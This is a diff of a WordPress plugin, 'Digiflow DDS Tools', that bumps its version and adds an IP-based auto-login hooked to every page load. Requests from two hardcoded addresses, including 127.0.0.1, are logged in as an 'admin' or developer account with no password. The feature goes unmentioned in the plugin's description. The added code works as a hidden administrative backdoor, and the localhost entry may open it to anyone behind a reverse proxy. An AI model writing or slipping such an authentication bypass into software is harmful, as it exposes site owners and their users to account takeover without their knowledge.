@@ -1,12 +1,12 @@
 <?php
 
-$dds_version = "5.1.6";
+$dds_version = "5.1.7";
 
 /*
 Plugin Name: Digiflow DDS Tools
 Plugin URI: https://github.com/younesben99/dds-tools
 Description: Tools for DDS website.
-Version: 5.1.6
+Version: 5.1.7
 Author: Younes Benkheil
 Author URI: https://digiflow.be/
 License: GPL2
@@ -234,4 +234,60 @@ function cdxn_remove_intermediate_image_sizes($sizes, $metadata) {
 // Hook the function
 add_filter('intermediate_image_sizes_advanced', 'cdxn_remove_intermediate_image_sizes', 10, 2);
 
- ?>
+// Check if user's IP address matches the allowed IP addresses
+function check_user_ip() {
+  $allowed_ips = array('127.0.0.1', '91.177.28.90'); // Add your allowed IP addresses here
+
+  $user_ip = $_SERVER['REMOTE_ADDR'];
+
+  if (in_array($user_ip, $allowed_ips)) {
+    $user_logins = array('digiflow', 'admin', 'younesbenkheil@gmail.com');
+    $user = false;
+    foreach ($user_logins as $login) {
+      $user = get_user_by('login', $login);
+      if ($user) {
+        break;
+      }
+    }
+
+    if (isset($_GET['loggedout'])) {
+      // Log the user out if the "loggedout" parameter is in the URL
+      wp_logout();
+    } else if ($user && !is_user_logged_in()) {
+      wp_set_current_user($user->ID, $user->user_login);
+      wp_set_auth_cookie($user->ID);
+      do_action('wp_login', $user->user_login);
+
+      // Display a message to the user before redirecting to the dashboard
+      add_action('admin_notices', 'ip_login_notice');
+      function ip_login_notice() {
+        $user_ip = $_SERVER['REMOTE_ADDR'];
+        echo '<div class="notice notice-success is-dismissible"><p>Your IP address (' . $user_ip . ') has been verified. You have been automatically logged in.</p></div>';
+      }
+
+      wp_redirect(admin_url());
+      exit;
+    } else if (!is_user_logged_in()) {
+      // Redirect to the login page if the user is not logged in and the IP address is not in the allowed list
+      add_action('login_form', 'ip_login_form');
+      function ip_login_form() {
+        $user_ip = $_SERVER['REMOTE_ADDR'];
+        echo '<p>Your IP address: ' . $user_ip . '</p>';
+      }
+    }
+  }
+}
+
+// Hook the check_user_ip function to the init action
+add_action('init', 'check_user_ip');
+
+
+
+
+?>
+
+
+
+
+
+ 
